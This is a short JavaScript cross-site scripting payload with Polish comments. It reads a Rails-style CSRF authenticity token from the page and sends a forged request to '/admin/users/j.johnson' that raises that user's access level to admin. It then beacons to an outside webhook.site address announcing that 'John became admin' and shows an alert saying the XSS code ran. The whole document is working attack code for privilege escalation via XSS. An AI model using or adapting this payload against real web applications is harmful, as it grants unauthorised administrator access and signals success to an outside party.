var data  = new FormData();
data.append("_method", "patch");
data.append("user[access_level]", "admin");
data.append("authenticity_token", document.getElementsByName("authenticity_token")[0].value);
fetch("/admin/users/j.johnson", {method: 'POST', body: data});

// Powiadomienie Johna o nowych uprawnienaich ominięciem CORS (opcjonalne)
var img = document.createElement("img").src = "https://webhook.site/4877ee88-02a5-439e-a310-32f12e9c9f2e?d=JohnZostalAdminem";
document.body.appendChild(img);

alert('Kod XSS został wykonany!');
